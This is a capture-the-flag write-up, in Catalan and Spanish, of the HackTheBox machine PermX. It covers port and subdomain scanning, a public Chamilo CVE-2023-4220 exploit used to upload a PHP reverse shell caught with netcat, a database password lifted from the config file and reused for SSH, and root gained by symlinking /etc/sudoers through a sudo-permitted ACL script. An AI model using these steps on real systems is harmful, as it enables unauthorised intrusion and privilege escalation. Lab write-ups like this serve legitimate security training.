# PermX

Plataforma: HackTheBox
OS: Linux
Level: Easy
Status: Done
Complete: Yes
Created time: 2 de diciembre de 2024 13:58
IP: 10.10.11.23

# Reconocimiento

> NMAP all ports:
> 

```bash
sudo nmap -p-  -open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.23 -oG allports

```

![image.png](/images/HackTheBox/image.png)

> NMAP specific ports
> 

```bash
sudo nmap -p22,80 -sCV 10.10.11.23 -oN nmap
```

![image.png](/images/HackTheBox/image%201.png)

## Serveis Web

Entrem  a la web i ens dona error. Ens posa que no pot conectar amb permx.htb
Afegitm el domini al host

```bash
echo -n '10.10.11.23 permx.htb' | sudo tee -a /etc/hosts > /dev/null

```

Llavors si accedir a la web:

![image.png](/images/HackTheBox/image%202.png)

BUsquem subdominis amnb ffuf

```bash
fuf -w [seclist] -u [<http://ejemplo.com>] -H "Host: FUZZ.board.htb" -fs 15949

```

Trobem subdomini : lms
S'afegeix al etc/hosts

![image.png](/images/HackTheBox/image%203.png)

Busquem directoris amb gobuster:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u <http://lms.permx.htb> -x .php,txt,py

```

![image.png](/images/HackTheBox/image%204.png)

Trobem un robots.txt

![image.png](/images/HackTheBox/image%205.png)

# Análisis de vulnerabilidades

> Exploit: Veiem que hi ha un exploit per aquesta versio de Cahaleon
> 

[https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit](https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit)

# Explotación de vulnerabilidades

Executem exploit:

```bash
./CVE-2023-4220.sh -f php-reverse-shell.php -h <http://lms.permx.htb/> -p 4444
nc -lvp 4444

```

Obtenim una web shell:

![image.png](/images/HackTheBox/image%206.png)

Busquem usuaris al etc/passwd

Usuari: mtz

Busquem permissos:

```bash
find / -perm -u=s -type f 2>/dev/null

```

![image.png](/images/HackTheBox/image%207.png)

Busquem credencials a la configuracio de Chamilo

fitxer: var/www/chamilo/conf/configration.php

![image.png](/images/HackTheBox/image%208.png)

User: chamilo
Pass: 03F6lY3uXAP2bkW8
Password encription: bcrypt

# Escalada de privilegios

Provem a fer servir aquest password amb usuari trobat abans: mtz

![image.png](/images/HackTheBox/image%209.png)

 Busquem permisos per usuar mtz

```bash
sudo -l
```

![image.png](/images/HackTheBox/image%2010.png)

Trobem un script que dona permisos. El podem executar amb sudo sense password

![image.png](/images/HackTheBox/image%2011.png)

Passa 3 variables i nomes funciona si estan dins de /home/mtz

provem de crear un acces directe a un fitxer de permisos (sudoers) per convertirnos en root

```bash
ln -s /etc/sudoers pwn
sudo ./acl.sh mtz rwx /home/mtz/pwn

```

Editem ara el fitxer pwn (sudoers) i posem al usuar mtz com a root

![image.png](/images/HackTheBox/image%2012.png)

Depres provem a convertirnos en root:

![image.png](/images/HackTheBox/image%2013.png)

# Bandera(s)

> User : 701d713ff73d48ac5f6b9ae821f003b7
Root: 1222f54c2310e04989eca2655389880a
>